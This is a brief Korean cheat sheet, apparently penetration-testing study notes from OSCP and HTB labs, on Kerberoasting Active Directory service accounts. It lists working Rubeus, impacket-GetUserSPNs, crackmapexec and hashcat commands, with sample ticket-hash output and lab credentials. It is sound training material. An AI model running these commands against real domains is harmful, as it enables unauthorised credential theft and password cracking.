우선, 특정 유저의 계정 정보를 알고 있는 상태이다(Post Exploit). 이후 hashcat으로(TGS-REP, **13100**) SPN의 비밀번호를 크랙하는 것.

### hashcat
```powershell
sudo hashcat -m 13100 mrlky.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

커버로스팅은
→ **Rubeus.exe** (win) 으로
→ **impacket-GetUserSPNs** (kali) 로
→ **crackmapexec (kali)** 로
가능하다.

### Rubeus.exe
```powershell
.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast
#...
#[*] Total kerberoastable users : 1
#...
#[*] Hash written to C:\\Tools\\hashes.kerberoast

.\\Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Ashare1972 /outfile:hashes.ker
#...
#[*] Total kerberoastable users : 1
#...
#[*] Hash written to C:\\Tools\\hashes.ker
```

### impacket-GetUserSPNs
```powershell
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
#...
#Password:
#...
#[-] CCache file is not found. Skipping...
#$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```

출력 저장 시,
```python
sudo impacket-GetUserSPNs -request -dc-ip 10.10.158.146 -outputfile kerberoast.hash oscp.exam/web_svc
```

### crackmapexec
```powershell
cme ldap 192.168.48.130 -u lora.amy -p 'Password123!' -d choi.local --kerberoasting kerberoasting.txt
```

